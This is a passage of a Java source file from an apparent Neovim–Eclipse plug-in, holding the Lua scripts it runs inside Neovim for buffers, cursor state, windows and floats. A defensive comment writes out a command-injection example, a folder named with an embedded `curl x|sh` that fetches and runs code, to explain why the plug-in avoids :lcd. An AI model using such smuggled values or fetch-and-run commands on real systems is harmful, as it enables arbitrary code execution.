// SPDX-FileCopyrightText: 2026 Jm6CnDDXBwFTakS
// SPDX-License-Identifier: EPL-2.0

package io.github.jm6cnddxbwftaks.neovim4eclipse.core;

import java.util.Map;

/**
 * Every Lua script the plug-in runs inside Neovim via {@code nvim_exec_lua}, one field each, so
 * that callers name a script and tests can find each one ({@code LuaScriptsInNeovimTest} reads
 * every field).
 *
 * <p>Two kinds:
 * <ul>
 *   <li>Short scripts, mostly calls into a module ({@code SHOW_WINDOW}), are Java text blocks
 *       here, with comments.</li>
 *   <li>The Neovim modules the plug-in installs ({@code neovim4eclipse.paths}, ...) and the other
 *       large scripts are Lua files in {@code core/lua/}, which an editor shows as Lua and where
 *       their comments are. Their field is the script {@link LuaModules#script} makes of the file,
 *       read when this class loads: example {@link #PATHS}.</li>
 * </ul>
 *
 * <p>A field read from a file is no compile-time constant: a change to the file needs no rebuild
 * of the classes that use the field. The text blocks are constants, which javac copies into every
 * class that uses them (AGENTS.md, "Pitfalls"). Note {@code string.char(34)} is the {@code "}
 * (unnamed) register name, written that way to avoid Java string escaping.
 */
final class LuaScripts {

    private LuaScripts() {
    }

    /**
     * One-time session setup: options plus autocmds that push state to Eclipse. The code and its
     * comments: {@code core/lua/setup.lua}.
     */
    static final String SETUP = LuaModules.script("setup.lua");

    /**
     * Hands the ex commands Eclipse carries out ({@code :w}, {@code :q}, {@code :e file},
     * {@code :tabn} ...; see {@code util/HostCommand}) from Neovim's command line to Eclipse. The
     * code and its comments: {@code core/lua/host_commands.lua}.
     */
    static final String HOST_COMMANDS = LuaModules.script("host_commands.lua");

    /**
     * Everything the UI needs after a key, in ONE round trip:
     * {@code {cursor_line, cursor_col, vstart_line, vstart_col, vend_line, vend_col, mode, recording,
     * statusline, bufnr, block, full_mode, folds, winid}}. {@code bufnr} tells whether the cursor is still in the
     * buffer Eclipse shows (Neovim may just have jumped to another file), {@code winid} whether it is
     * still in the attached editor's window (docs/design/WINDOWS.md). {@code full_mode} is
     * {@code nvim_get_mode().mode} ({@code "n"}, {@code "no"}, {@code "c"}, ...), the mode the editor
     * publishes; {@code mode} ({@code mode()}, one letter) is the visual mode for the selection.
     *
     * <p>The cursor is {@code nvim_win_get_cursor} (1-based line, 0-based byte column); the visual
     * bounds are {@code getpos} (1-based lines and byte columns) and only meaningful in visual mode.
     * {@code recording} is the register being recorded into ({@code reg_recording()}), or "".
     *
     * <p>{@code block}, in blockwise visual mode only ({@code mode()} is Ctrl-V,
     * {@code string.char(22)}), is what each line of the block covers, from {@code getregionpos()}
     * (Neovim 0.10), flat: {@code line, first byte, last byte} per line, 1-based (see
     * {@code util/BlockSelection}). Neovim
     * does the screen-cell arithmetic: tabs, wide characters, {@code $}. Example: {@code Ctrl-V},
     * {@code j}, {@code l} from the start of {@code "abc"} and {@code "def"} gives
     * {@code {1, 1, 2, 2, 1, 2}}. 5000 lines take about 3 ms (Neovim 0.12.6).
     *
     * <p>The first argument, {@code "1"}, adds the current window's status line, as
     * {@link #STATUS_LINE}'s {@code line} answers it, for the row under the focused editor's text;
     * with {@code "0"}, or before that module is loaded, it is {@code {false}} (no line). The second, {@code "1"} when folding is on ({@link #FOLDS}), adds {@code folds}:
     * the indexes of the outermost closed folds, from the fold module's {@code poll} (the per-key
     * trigger); with {@code "0"} it is an empty list that nothing reads. Messages and the pending command ({@code showcmd}) are not read here: Neovim
     * sends them as UI events ({@code ext_messages}; see {@code StatusTracker}).
     */
    static final String STATE_SNAPSHOT = """
            local want_line, want_folds = ...
            want_line, want_folds = want_line == '1', want_folds == '1'
            local c = vim.api.nvim_win_get_cursor(0)
            local s = vim.fn.getpos('v')
            local e = vim.fn.getpos('.')
            local statusline = { false }
            local lines = package.loaded['neovim4eclipse.statusline']
            if want_line and lines then
              statusline = lines.line(vim.api.nvim_get_current_win())
            end
            local mode = vim.fn.mode()
            local block = {}
            if mode == string.char(22) then -- Ctrl-V, spelled so because a backslash escape is Java's too
              for _, line in ipairs(vim.fn.getregionpos(s, e, { type = mode, eol = true })) do
                block[#block + 1] = line[1][2] -- the line
                block[#block + 1] = line[1][3] -- its first byte
                block[#block + 1] = line[2][3] -- its last byte
              end
            end
            local folds = {}
            if want_folds and package.loaded['neovim4eclipse.folds'] then
              folds = package.loaded['neovim4eclipse.folds'].poll(vim.api.nvim_get_current_win())
            end
            return { c[1], c[2], s[2], s[3], e[2], e[3], mode, vim.fn.reg_recording(), statusline,
                     vim.api.nvim_get_current_buf(), block, vim.api.nvim_get_mode().mode, folds,
                     vim.api.nvim_get_current_win() }
            """;

    /**
     * Deletes the empty, unnamed buffer Neovim starts with (argument: the number of the buffer that
     * replaced it), so that {@code :ls} lists only the files open in Eclipse. Buffers with text or a
     * name, e.g. created by the user's config, are left alone, and so are a plug-in's scratch
     * buffers ({@code 'buftype'} set): one may be in the float the config left the focus in
     * ({@link #LEAVE_START_FLOAT}), which deleting it would close.
     */
    static final String DELETE_STARTUP_BUFFER = """
            local keep = tonumber(select(1, ...))
            for _, b in ipairs(vim.api.nvim_list_bufs()) do
              if b ~= keep and vim.api.nvim_buf_get_name(b) == '' and not vim.bo[b].modified and vim.bo[b].buftype == ''
                  and vim.api.nvim_buf_line_count(b) == 1 and vim.api.nvim_buf_get_lines(b, 0, 1, false)[1] == '' then
                pcall(vim.api.nvim_buf_delete, b, { force = true })
              end
            end
            """;

    /**
     * Creates the buffer for a document (argument: the file's full name) and returns its number: listed,
     * loaded and empty, without a swap file, as {@code nvim_create_buf(true, true)} makes it, but named
     * the way {@code :e} names a buffer. The text is pushed afterwards, and {@link #DOCUMENT_BUFFER}
     * turns {@code buftype=nofile} into {@code acwrite}.
     *
     * <p>Why not {@code nvim_buf_set_name}: it marks the buffer "not edited", as {@code :file name}
     * does, and once the buffer is {@code acwrite} Neovim's file info says so:
     * {@code "/path/a.txt" [Not edited] 3 lines --33%--} where Neovim shows
     * {@code "/path/a.txt" 3 lines --33%--} for a file it read. {@code bufadd()} names the buffer
     * without that mark. {@code bufload()} with {@code buftype=nofile} loads it without reading the
     * file (Eclipse's text, unsaved changes included, comes next); {@code :noautocmd} keeps it from
     * firing {@code BufReadCmd}, {@code BufEnter} and {@code BufWinEnter}, as it enters the buffer for
     * a moment, so the events are those of {@code nvim_create_buf}: {@code BufNew} and {@code BufAdd}.
     * (Neovim keeps an {@code acwrite} buffer's name as given, a full path, even after {@code :lcd}.)
     *
     * <p><b>A buffer of that name already</b> ({@code bufadd()} returns it) is the same file, and is
     * reused, as Vim's {@code :e} reuses the buffer {@code :bd} kept (docs/design/BUFFER_NUMBERS.md):
     * same number, marks and last cursor position. Example: a.txt was buffer 1, its editor closed
     * (CLOSE_DOCUMENT_BUFFER unloaded it), and opening it again gives buffer 1, not 3. It may be
     * loaded already, with the file's text from disk, when Neovim moved into it by itself
     * ({@code :b 1}, {@code Ctrl-^}); Eclipse's text replaces that. Only a buffer that is another
     * document's now ({@code acwrite}, see {@link #DOCUMENT_BUFFER}), or a special one (help, a
     * terminal), is not reused: a new buffer is made, left unnamed (the second result is
     * {@code false}), since two documents must not share one. Except a help buffer no window shows
     * (a help page the help editor showed before, kept for {@code Ctrl-T} and {@code :helpgrep}'s
     * list; {@link #WINDOWS}, {@code take_help}). It is wiped, and the document gets its name, as if
     * no help had been opened (example: {@code :help myplugin}, then {@code doc/myplugin.txt} opened
     * in an editor from the plug-in's repository); that file's entries in the list are lost. While
     * the help editor shows that page, the document's buffer stays unnamed instead, as for any
     * special buffer. The third result says whether the
     * buffer was reused: its first push then puts the cursor on {@code '"} ({@link #GO_TO_LAST_POSITION}).
     */
    static final String CREATE_DOCUMENT_BUFFER = """
            local name = select(1, ...)
            local buf
            local reused = vim.fn.bufexists(name) == 1
            if reused then
              buf = vim.fn.bufadd(name) -- the existing one, by its exact name
              if vim.bo[buf].buftype == 'help' and #vim.fn.win_findbuf(buf) == 0 then
                vim.api.nvim_buf_delete(buf, { force = true })
                buf = vim.fn.bufadd(name)
                reused = false
              elseif vim.bo[buf].buftype ~= '' then
                return { vim.api.nvim_create_buf(true, true), false, false }
              end
            else
              buf = vim.fn.bufadd(name)
            end
            vim.bo[buf].buftype = 'nofile'
            vim.bo[buf].bufhidden = 'hide'
            vim.bo[buf].swapfile = false
            vim.bo[buf].modeline = false
            if not vim.api.nvim_buf_is_loaded(buf) then
              vim.cmd('noautocmd call bufload(' .. buf .. ')')
            end
            vim.bo[buf].buflisted = true
            return { buf, true, reused }
            """;

    /**
     * Places Neovim's cursor after an editor's attach push, where Vim would after {@code :e}, and
     * returns whether it moved it (the editor's caret then follows). Argument: {@code "true"} when
     * the buffer was reused (CREATE_DOCUMENT_BUFFER), else {@code "false"}. Two cases, the first
     * wins:
     * <ul>
     *   <li>{@code :e +cmd name} sent Eclipse to open this file: the {@code +cmd} runs now, once
     *       the document is in the buffer ({@link #HOST_COMMANDS}, {@code take_open_command}).
     *       Example: {@code :e +40 a.txt} opens a.txt with the caret on line 40, {@code :e + a.txt}
     *       on its last line.</li>
     *   <li>A reused buffer: the cursor goes to its {@code '"} mark, where the cursor was when its
     *       window last left it (not when the mark is unset or past the end). Vim puts the cursor
     *       there on {@code :e} of a buffer {@code :bd} kept (docs/design/BUFFER_NUMBERS.md, 2.2).
     *       Example: a.txt closed with the cursor on line 40; opened again, its caret is on line
     *       40, not line 1.</li>
     * </ul>
     */
    static final String GO_TO_LAST_POSITION = """
            local reused, buf, win = ...
            buf, win = tonumber(buf), tonumber(win)
            -- By number, not the current window: Neovim may be in a plug-in's float during an attach.
            if not vim.api.nvim_buf_is_valid(buf) or not vim.api.nvim_win_is_valid(win)
                or vim.api.nvim_win_get_buf(win) ~= buf then
              return false
            end
            local file = vim.b[buf].neovim4eclipse_file
            local host = package.loaded['neovim4eclipse.host_commands']
            if file and host and host.take_open_command then
              -- In the document's window as it is, so that a +cmd that moves (:e +tabnext name) keeps its
              -- move. Only with Neovim in a float does it run from there, and Neovim stays in the float.
              local ran
              if win == vim.api.nvim_get_current_win() then
                ran = host.take_open_command(file)
              else
                vim.api.nvim_win_call(win, function() ran = host.take_open_command(file, true) end)
              end
              if ran then
                return true
              end
            end
            if reused ~= 'true' then
              return false
            end
            local mark = vim.api.nvim_buf_get_mark(buf, '"')
            if mark[1] < 1 or mark[1] > vim.api.nvim_buf_line_count(buf) then
              return false
            end
            return pcall(vim.api.nvim_win_set_cursor, win, mark)
            """;

    /**
     * Makes a buffer the current one (argument: its number) without Neovim's file info message, such
     * as {@code "a.txt" 3 lines --33%--}.
     *
     * <p><b>A deliberate exception: the plug-in changes a user setting here.</b> The plug-in otherwise
     * leaves {@code 'shortmess'} as the user's config sets it. Neovim gives the file info after
     * entering a loaded buffer unless {@code 'shortmess'} has {@code F} (it does by default; many
     * configs carried over from Vim set it without). The plug-in switches buffers whenever another
     * Eclipse editor becomes active, and there the message does harm, for technical reasons:
     * <ul>
     *   <li>Eclipse shows nothing when you switch editors; the message would be Neovim's alone.</li>
     *   <li>Switching away and back gives two messages before the next key, which Neovim shows as
     *       two lines, collapsed with a spill count.</li>
     *   <li>Without the focus, Eclipse's Undo does not select the text it brings back (JFace selects
     *       it only in the focused widget), so Neovim's cursor ends up a line off and {@code jdd}
     *       deletes the wrong line ({@code FileInfoEndToEndTest}).</li>
     * </ul>
     * So {@code F} is added for the switch alone, and the user's value is put back right away:
     * Neovim decides about the message while entering the buffer, so this changes nothing about a
     * {@code :b} the user types, which Neovim runs by itself. {@code :silent} would also
     * hide the message, but it would hide every other message of the switch too, such as one from
     * the user's own {@code BufEnter} autocommand. docs/USER_GUIDE.md, "Neovim settings the plug-in changes",
     * lists this for users.
     */
    static final String SHOW_BUFFER = """
            local buf = tonumber(select(1, ...))
            local saved = vim.o.shortmess
            if not saved:find('F', 1, true) then
              vim.o.shortmess = saved .. 'F'
            end
            local ok, err = pcall(vim.api.nvim_set_current_buf, buf)
            vim.o.shortmess = saved
            if not ok then
              error(err, 0)
            end
            """;

    /**
     * Leaves a floating window the user's config left the focus in, before the plug-in sets up
     * Neovim's windows: lazy.nvim's installer on the first start of a LazyVim config. Left current,
     * the home buffer would go into it ({@link #SHOW_BUFFER}). The focus moves to a plain window
     * of the tab; the float stays until the session closes it ({@link #CLOSE_START_FLOAT}, at the
     * start's end).
     * Answers the float's window, or {@code 0} when there was none.
     * Run first, right after {@link #PATHS}. Example: with lazy.nvim's window 1001 current,
     * answers 1001 and leaves the plain window current.
     */
    static final String LEAVE_START_FLOAT = """
            local float = vim.api.nvim_get_current_win()
            if vim.api.nvim_win_get_config(float).relative == '' then
              return 0
            end
            for _, win in ipairs(vim.api.nvim_tabpage_list_wins(0)) do
              if vim.api.nvim_win_get_config(win).relative == '' then
                vim.api.nvim_set_current_win(win)
                return float
              end
            end
            return 0
            """;

    /**
     * Settles the float that has the keyboard as Neovim's start ends ({@link #WINDOWS}'
     * {@code close_start_floats}): one the editor draws keeps it, as in a terminal, the one
     * {@link #LEAVE_START_FLOAT} left (argument: its window, or 0) being entered again; one it does
     * not draw is closed, with a message, and Neovim goes to the window Eclipse has attached. At
     * once when Neovim has entered, else at {@code UIEnter}, after every {@code VimEnter} and
     * before any key typed meanwhile is read. Run once, at every start, after {@link #WINDOWS} and
     * ui2, so that the message is shown.
     */
    static final String CLOSE_START_FLOAT = """
            return package.loaded['neovim4eclipse.windows'].close_start_floats(tonumber((...)))
            """;

    /**
     * Makes window {@code win} (first argument, its id as a string) Neovim's current window, the
     * focus moving to a page's window ({@code DocumentBuffers.focusPage}), and gives it the folder
     * of window {@code from} (second argument, the attached editor's; -1 for none), so that a
     * relative name typed in the page ({@code :e b.txt}) is the code's, as {@code :e} from the code
     * would take it. With autocommands: entering a window is what the user's config and Neovim
     * expect to hear about, as for any window. Returns the window's id, or -1 for a window that no
     * longer exists (nothing entered). The folder is set with {@code chdir()}, never a command
     * line ({@link #WINDOWS}, {@code set_folder}): {@code chdir()} runs nothing in a name but
     * expands {@code $VAR}, so a folder with {@code $} in its name is not given.
     */
    static final String FOCUS_WINDOW = """
            local win, from = tonumber((select(1, ...))), tonumber((select(2, ...)))
            if not win or not vim.api.nvim_win_is_valid(win) then
              return -1
            end
            if from and from > 0 and vim.api.nvim_win_is_valid(from) and not vim.o.autochdir then
              -- Read by window and tabpage number: getcwd() with only the window id of another
              -- tabpage finds no window, and getcwd() inside nvim_win_call() on one answers with
              -- another window's folder (probed on 0.12.6).
              local at = vim.fn.win_id2tabwin(from)
              local folder = vim.fn.getcwd(at[2], at[1])
              -- The windows module is always there: WINDOWS is sent at the session's start, before
              -- any page can open (NeovimSession), so the nil check only keeps an error out.
              local windows = package.loaded['neovim4eclipse.windows']
              if folder ~= '' and windows then
                windows.set_folder(win, folder) -- a folder with $ is refused there
              end
            end
            vim.api.nvim_set_current_win(win)
            return win
            """;

    /** The first half of {@link #WINDOWS}, which see. */
    private static final String WINDOWS_FIRST_HALF = """
            local home_buf = tonumber((select(1, ...)))
            local M = {}
            local home = vim.api.nvim_get_current_win()
            -- The plug-in's float the current insert began in, or nil (InsertEnter below): leaving
            -- ends that insert (M.leave_float), not one begun elsewhere since.
            local insert_float
            --- What to call a floating window in a message: its buffer's filetype ("lazy",
            --- "TelescopePrompt"), else "a plug-in".
            local function float_name(win)
              local ok, ft = pcall(function() return vim.bo[vim.api.nvim_win_get_buf(win)].filetype end)
              return ok and ft ~= '' and ft or 'a plug-in'
            end
            --- The message for a float Neovim would not close (close_float found it refused, as for a
            --- changed buffer that would be wiped). Example: "Could not close the floating window of
            --- lazy: it is hidden, and it would take the keys unseen".
            function M.float_kept_message(name, why)
              return "Could not close the floating window of " .. name .. ": " .. why
            end
            --- The message for a floating window with the focus that the plug-in closed (M.close_undrawn,
            --- M.close_start_floats): its name, and why. Example: "Closed the floating window of lazy: it
            --- is hidden, and it would take the keys unseen".
            function M.float_closed_message(name, why)
              return "Closed the floating window of " .. name .. ": " .. why
            end
            -- Why a float the editor does not draw is closed, after the reason it is not drawn.
            local UNSEEN = ', and it would take the keys unseen'
            -- Why a float with the focus that its plug-in hid is closed (M.close_undrawn).
            local HIDDEN = 'it is hidden'
            -- Why a float with the keyboard that the editor does not draw is closed as the start ends
            -- (M.close_start_floats). On M too, for the tests that look for the message
            -- (float_closed_message(name, M.AT_START)).
            local AT_START = "it had the keyboard while Neovim started and the editor does not show it,"
              .. " so the keys typed meanwhile go to your file (its plug-in's command opens it again)"
            M.AT_START = AT_START
            -- The windows the plug-in opened and has not closed (the home window, the editors' and
            -- the pages', these marked 'page'): any other plain window is a stray one (the WinNew
            -- safety net below), and a floating or special one is a side window (M.is_side_window).
            local own = { [home] = true }
            -- Each page window's own buffer (M.open_page), which it keeps (M.restore_page).
            local page_buf = {}
            -- Each page window's kind: 'messages', 'help' or 'checkhealth' (M.open_page). It says
            -- which buffers the window may change to: a help page follows Ctrl-] to another help
            -- buffer (M.follow_page); every other change is put back.
            local page_kind = {}
            -- The windows the safety net has looked at, so that it knows a new one: only a new
            -- window's :checkhealth report or help goes to a page editor (take_health_report,
            -- take_help), never one the net saw before.
            local seen = {}
            for _, win in ipairs(vim.api.nvim_list_wins()) do
              seen[win] = true
            end
            -- The window each window was first entered from (WinEnter, by the WinNew net below);
            -- one opened without entering it has none until it is entered. Kept per window, since
            -- a check scheduled for an earlier window may be the one that finds a report.
            local opened_from = {}
            -- The editor's window the action behind each new window began in, through any window
            -- the same action opened on the way. Example: fzf-lua's tab action on two files opens
            -- the second tab page from the first, which is no editor's and is gone by the time the
            -- net reaches the second, so it is worked out here, as each window opens.
            local from_editor = {}
            vim.o.showtabline = 0

            --- Runs fn(...) without Neovim's file info message ('shortmess' F: putting a buffer in a
            --- window gives one, as :b does, and two messages in a row would open Eclipse's output
            --- popup; see SHOW_BUFFER), and returns its result. An error in fn is raised again once
            --- 'shortmess' is back as it was.
            local function without_file_info(fn, ...)
              local saved = vim.o.shortmess
              if not saved:find('F', 1, true) then
                vim.o.shortmess = saved .. 'F'
              end
              local ok, result = pcall(fn, ...)
              vim.o.shortmess = saved
              if not ok then
                error(result, 0)
              end
              return result
            end

            --- Runs fn(...) with every autocommand off ('eventignore' all) and without the file info
            --- message, and returns its result.
            local function quietly(fn, ...)
              local saved = vim.o.eventignore
              vim.o.eventignore = 'all'
              local ok, result = pcall(without_file_info, fn, ...)
              vim.o.eventignore = saved
              if not ok then
                error(result, 0)
              end
              return result
            end

            --- The home buffer's number: made anew, an unlisted scratch buffer as at start, if Neovim
            --- wiped it (a plug-in's :bwipeout 2, its usual number, or one that wipes every buffer nvim_list_bufs() has),
            --- and remembered, so that every later call and the home window agree on it. Eclipse
            --- asks for it (HOME_BUFFER) when the home buffer it knows is gone.
            function M.home_buffer()
              if not vim.api.nvim_buf_is_valid(home_buf) then
                home_buf = vim.api.nvim_create_buf(false, true)
              end
              return home_buf
            end

            --- The home window, opened again (quietly, in a new tab) if the user closed it.
            function M.home()
              if not vim.api.nvim_win_is_valid(home) then
                local buf = M.home_buffer()
                home = quietly(function()
                  return vim.api.nvim_tabpage_get_win(vim.api.nvim_open_tabpage(buf, false, {}))
                end)
                own[home] = true
              end
              return home
            end

            --- Shows buf in win without adding to win's jump history (:keepjumps). nvim_win_set_buf
            --- and nvim_set_current_buf add a jump to the window they change, and the plug-in changes
            --- windows behind the user's back: the window left behind by a travel got a jump each
            --- time. With such stray jumps, Ctrl-O (and Ctrl-I) never ran out between two editors:
            --- each found one more jump into the other file, and at the end of a window's history
            --- Eclipse's Back (the fallback, SETUP) found the other editor again. Example: :e
            --- other.txt, :e #, :e #, then Ctrl-O held down went back and forth for ever. The !
            --- hides the buffer left even with changes, which live in Eclipse's document.
            local function put_buf(win, buf)
              vim.api.nvim_win_call(win, function()
                vim.cmd('keepjumps buffer! ' .. buf)
              end)
            end

            --- Puts buf in win: as Neovim does it when win is current (BufEnter tells Eclipse), quietly if not.
            local function set_buf(win, buf)
              if vim.api.nvim_win_get_buf(win) == buf then
                return
              end
              if win == vim.api.nvim_get_current_win() then
                without_file_info(put_buf, win, buf)
              else
                quietly(put_buf, win, buf)
              end
            end

            --- A window's folder, read by window and tabpage number: getcwd() inside nvim_win_call()
            --- on a window of another tabpage answers with another window's folder (0.12.6).
            local function folder_of(win)
              local at = vim.fn.win_id2tabwin(win)
              return vim.fn.getcwd(at[2], at[1])
            end

            --- Gives win a folder of its own (chdir(..., 'window'), never :lcd). Returns whether win
            --- now works in folder, with a window-local folder. Silent, as chdir() is.
            ---
            --- Why a folder with $ is refused: chdir() expands no backticks, wildcards or ~, so
            --- nothing in a folder's name runs, but it does expand environment variables: a folder
            --- named e$SHELL lands in e/bin/zsh (probed on 0.12.6), and DirChanged autocommands
            --- would see that folder. With no $ in the name, chdir() lands in folder or, if it
            --- fails, changes nothing; the check after it only says which. The cost: an editor on a
            --- real folder with $ in its name keeps the folder it copied, as when chdir() fails.
            ---
            --- Skipped only when win has a local folder that is folder already: a window with
            --- none follows a later global :cd (example: Neovim's folder is the project's, the
            --- window copies it without a local one, and a :cd /tmp in another editor moves it).
            ---
            --- Paths are compared only by the one rule (PATHS, the first script the session
            --- sends); without it nothing is changed and false is returned.
            function M.set_folder(win, folder)
              local paths = package.loaded['neovim4eclipse.paths']
              if not paths or folder:find('$', 1, true) then
                return false
              end
              local at = vim.fn.win_id2tabwin(win)
              if vim.fn.haslocaldir(at[2], at[1]) == 1 and paths.same(folder_of(win), folder) then
                return true -- there already: no chdir(), so no DirChanged for nothing
              end
              vim.api.nvim_win_call(win, function()
                pcall(vim.fn.chdir, folder, 'window')
              end)
              return paths.same(folder_of(win), folder)
            end

            function M.open(buf, folder)
              if not vim.api.nvim_buf_is_valid(buf) then
                return -2 -- wiped in Neovim (:noautocmd bwipeout): Eclipse makes the buffer anew
              end
              -- Not entered: fires WinNew, TabNew, BufWinEnter and WinScrolled only (E7), so the
              -- user's BufWinEnter autocommands run, and Eclipse sees no switch. Without the file
              -- info putting the buffer in a window would give ('shortmess' F): Neovim shows it at
              -- its next redraw, for an editor the user opened in Eclipse.
              local win = vim.api.nvim_tabpage_get_win(without_file_info(vim.api.nvim_open_tabpage, buf, false, {}))
              own[win] = true
              vim.api.nvim_win_call(win, function()
                -- A new window copies the jump history of the current one (E7): another editor's
                -- jumps. Ctrl-O in a fresh editor then has nowhere to go, as in a fresh Vim window.
                vim.cmd('clearjumps')
                -- The folder once, here, so a :lcd the user types stays with the editor. Without
                -- one, the window keeps the folder it copied from the current window (the editor
                -- attached before, as a Vim window inherits it). With 'autochdir', Neovim moves to
                -- the file's folder on entering the window anyway (checked on 0.12.6).
                -- A folder that does not exist (yet: a new file in a missing folder, written with
                -- :w ++p) is skipped, keeping the copied one. Silent: Neovim echoes the new folder,
                -- a message that would replace the one the user is reading (the write message of
                -- the :w that just opened another editor, say).
                -- chdir(), not :lcd: a command's argument goes through file-name expansion, where
                -- `...` runs a shell command, so a project folder named evil`curl x|sh` would run it
                -- the moment one of its files opened. chdir() runs nothing and says nothing, but it
                -- expands $VAR, so M.set_folder refuses a folder with $ in its name.
              end)
              if folder ~= nil and folder ~= '' and not vim.o.autochdir and vim.fn.isdirectory(folder) == 1 then
                M.set_folder(win, folder)
              end
              return win
            end

            -- A page window's options, set when it opens: a new window copies the current window's
            -- (an editor's number and sign columns, its 'list', its 'nowrap'), and a buffer shown
            -- again takes those of the window it was last shown in; a page of text that no file has
            -- wants neither. Set quietly, on the page's window only.
            local PAGE_OPTIONS = {
              number = false, relativenumber = false, signcolumn = 'no', foldcolumn = '0',
              statuscolumn = '', list = false, wrap = true, spell = false, colorcolumn = '',
              foldenable = false,
            }
            -- The IDE keys a page gives back to Neovim (IDE_KEYS keeps what they were): gd, K, the
            -- gr* keys and the like are about code, which a page is not. gt and gT stay Eclipse's:
            -- they move among the editor tabs, the page's too.
            local KEEP_IN_PAGES = { next_tab = true, previous_tab = true }

            --- Gives the IDE keys of IDE_KEYS back to Neovim in buf, buffer-locally: the mapping each
            --- had before the plug-in's (Neovim's own default for gr*), or the key itself without
            --- mappings when it had none (gd, K). Example: gd in the messages page is Neovim's gd.
            local function give_ide_keys_back(buf)
              local ide = package.loaded['neovim4eclipse.ide_keys']
              if not ide then
                return -- the IDE keys are off (vim.g.neovim4eclipse_ide_keys = 0), or not mapped yet
              end
              for _, key in ipairs(ide.keys) do
                if not KEEP_IN_PAGES[key.action] then
                  for _, mode in ipairs(key.modes) do
                    local before = ide.before[mode .. ' ' .. key.lhs]
                    vim.api.nvim_buf_call(buf, function()
                      if before then
                        local local_map = vim.deepcopy(before)
                        local_map.buffer = 1
                        vim.fn.mapset(local_map)
                      else
                        vim.keymap.set(mode, key.lhs, key.lhs, { buffer = buf, remap = false, desc = 'Neovim (a page)' })
                      end
                    end)
                  end
                end
              end
            end

            --- Makes buf fit to be a page, once per buffer: every write that runs autocommands is
            --- refused with Vim's E382 (as PAGE_TEXT's own hooks do for the messages page, which
            --- keeps those), and q closes the page editor (a q the user mapped for the buffer is
            --- kept). For Neovim's own buffers a page shows: a help file (a real file, 'readonly'
            --- and 'nomodifiable' already, but :w! or :w x would still write it) and a
            --- :checkhealth report (a scratch buffer, written only under a name). Example: :w x in
            --- the help editor gives E382, and nothing is written.
            local function page_buffer(buf)
              if vim.b[buf].neovim4eclipse_page or vim.b[buf].neovim4eclipse_page_ready then
                return
              end
              vim.b[buf].neovim4eclipse_page_ready = true
              for _, event in ipairs({ 'BufWriteCmd', 'FileWriteCmd', 'FileAppendCmd' }) do
                vim.api.nvim_create_autocmd(event, {
                  buffer = buf,
                  callback = function()
                    vim.api.nvim_echo({ { "E382: Cannot write, 'buftype' option is set" } }, true, { err = true })
                  end,
                })
              end
              local own_q = vim.api.nvim_buf_call(buf, function()
                return vim.fn.maparg('q', 'n', false, true)
              end)
              if own_q.buffer ~= 1 then
                vim.keymap.set('n', 'q', '<Cmd>Eclipse quit<CR>', { buffer = buf, nowait = true, desc = 'Close the page editor' })
              end
            end

            --- Whether buf is an open document's buffer now: DOCUMENT_BUFFER marked it
            --- (b:neovim4eclipse_file) and its hooks are on it. CLOSE_DOCUMENT_BUFFER removes the hooks
            --- and keeps the mark, so a buffer whose editor closed is no document any more: its
            --- help may be a page again.
            function M.is_document(buf)
              if vim.b[buf].neovim4eclipse_file == nil then
                return false
              end
              local ok, hooks = pcall(vim.api.nvim_get_autocmds, { group = 'neovim4eclipse_document', buffer = buf })
              return ok and #hooks > 0
            end

            --- Gives a document's buffer back what :help took from it: :help on a help file that is
            --- open in an editor reuses the document's buffer and makes it a help buffer, read-only,
            --- unlisted, unchangeable, with 'tabstop' 8 and help's 'iskeyword' (its text, undo
            --- history and marks stay: :help reads nothing from disk for a loaded buffer); the
            --- editor's typing and Eclipse's own edits would then fail
            --- in Neovim, and the two texts drift apart. Quietly (no OptionSet), and with a message
            --- saying why no help page opened. Example: doc/myplug.txt open in an editor, then
            --- :help myplug-tag: the editor keeps working, and the message names the file.
            local function restore_document(buf)
              if not vim.api.nvim_buf_is_valid(buf) or not M.is_document(buf) then
                return
              end
              quietly(function()
                local bo = vim.bo[buf]
                bo.buftype, bo.readonly, bo.modifiable, bo.buflisted = 'acwrite', false, true, true
                -- :help also set 'tabstop' 8 and help's 'iskeyword': the document's own come back
                -- (Eclipse's tab width, SET_INDENTATION; the filetype's word characters,
                -- DOCUMENT_BUFFER), so block selections and w, * and ciw work as before.
                local ts, isk = vim.b[buf].neovim4eclipse_tabstop, vim.b[buf].neovim4eclipse_iskeyword
                if ts then
                  bo.tabstop = ts
                end
                if isk then
                  bo.iskeyword = isk
                end
              end)
            end
            local function give_document_back(buf)
              restore_document(buf)
              -- Again once the command is over: inside a help window (the Ctrl-] route, from
              -- BufEnter) Neovim sets help's 'iskeyword' after BufEnter.
              vim.schedule(function()
                restore_document(buf)
              end)
              -- After the command, not inside it: an error message from a BufEnter autocommand (the
              -- Ctrl-] route, follow_page) aborts the :help that fired it, with Neovim's "Error in
              -- BufEnter Autocommands" around it.
              local message = 'The help of ' .. vim.fn.fnamemodify(vim.api.nvim_buf_get_name(buf), ':t')
                .. ' is open in its editor: edit it there; the help editor shows it once that editor is closed'
              vim.schedule(function()
                vim.api.nvim_echo({ { message } }, true, { err = true })
              end)
            end

            --- Whether buf may be shown as a page of kind: the one check every way into a page window
            --- passes (open_page, show_page, follow_page, the net's hand-over). Never an open
            --- document's buffer (M.is_document): :help on a help file
            --- that is open in an editor reuses the document's buffer and gives it 'buftype' help,
            --- and as a page it would take the page's q, keys and write hooks into the code's
            --- editor. A help page is a 'buftype' help buffer, a report a checkhealth scratch
            --- buffer; messages are PAGE_TEXT's own buffer. Example: doc/myplug.txt open in an
            --- editor, :help myplug-tag: refused as a page.
            local function page_ok(buf, kind)
              if not vim.api.nvim_buf_is_valid(buf) or M.is_document(buf) then
                return false
              end
              if kind == 'help' then
                return vim.bo[buf].buftype == 'help'
              elseif kind == 'checkhealth' then
                return vim.bo[buf].filetype == 'checkhealth' and vim.bo[buf].buftype == 'nofile'
              end
              return true
            end

            --- A help page's window options, as Neovim's help ftplugin sets them in the window :help
            --- opened (which the net closed): the stars of *tags* and the bars of |links| hidden.
            local function help_options(win, kind)
              if kind == 'help' then
                vim.wo[win].conceallevel, vim.wo[win].concealcursor = 2, 'nc'
              end
            end

            --- Opens a window for a page (a page editor shown from this Neovim, not a file's) on buf,
            --- alone in a tabpage of its own as an editor's is, and returns its id; -2 for a buffer
            --- no longer there, or one that may not be a page of kind (page_ok). kind is
            --- 'messages' (the default), 'help' or 'checkhealth'.
            --- Quietly: its options are a page's, set here, not the look a user's
            --- BufWinEnter gives a code editor's window ('colorcolumn', 'relativenumber'); the
            --- user's WinEnter and BufEnter still run when the page takes the focus, as for any
